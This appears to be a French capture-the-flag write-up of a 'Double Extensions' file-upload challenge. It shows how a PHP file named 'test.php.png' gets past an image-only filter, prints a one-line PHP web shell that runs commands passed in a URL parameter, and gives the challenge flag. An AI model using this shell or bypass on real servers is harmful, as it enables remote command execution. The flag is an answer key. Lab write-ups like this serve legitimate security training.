## Challenges

### Serveur Web

### Challenge : Double Extensions

#### Problème

Cette épreuve consiste à uploader un code PHP dans cette galerie de photos.

#### Résolution

Dans cette étape, nous démarrons le défi. Sur la page qui s'affiche, cliquez sur "upload", cela vous redirige vers une page où vous pouvez uploader une image. Une remarque sur la page : **NB : seuls les fichiers GIF, JPEG ou PNG sont acceptés.**

En cliquant sur "choose file", vous pouvez choisir un fichier à uploader. Si vous choisissez un fichier .php, un message s'affiche : **Wrong file type!**

Pour contourner cette restriction, nous allons créer un fichier '.php' que nous nommerons "test.php.png" et que nous uploaderons. En ajoutant '.png' à la fin du nom de fichier, nous faisons en sorte que le filtre appliqué aux fichiers téléchargés pense qu'il s'agit d'une image (voir le challenge File upload_null byte (S1)).

Dans le fichier test.php.png, nous insérons le code suivant :

```php
<?php
system($_GET['command']);
?>
```

Ensuite, nous pouvons le télécharger. Le flag s'affiche sur la page après avoir cliqué sur le bouton "upload".

#### Solution

Le flag est : `Gg9LRz-hWSxqqUKd77-_q-6G8`.